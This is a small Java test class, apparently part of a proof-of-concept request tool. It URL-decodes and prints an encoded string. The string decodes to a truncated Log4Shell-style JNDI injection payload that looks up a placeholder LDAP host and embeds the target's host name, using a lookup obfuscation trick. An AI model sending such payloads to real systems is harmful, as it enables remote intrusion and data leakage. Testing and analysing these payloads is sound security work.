package main.RequestPoc;

import java.net.URLDecoder;
import java.net.URLEncoder;
import java.util.HashMap;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class test3 {
    public static void main(String[] args) {
        String a = "%24%7Bjndi:ldap://%24%7BhostName%7DXXXX%24%7B::-.%ht";
        String decode_text = "";
        a = a.replaceAll("%(?![0-9a-fA-F]{2})", "%25");
        try {
            decode_text = URLDecoder.decode(a, "utf-8");
        }catch (Exception e){
            e.printStackTrace();
        }

        System.out.println(decode_text);

    }
}
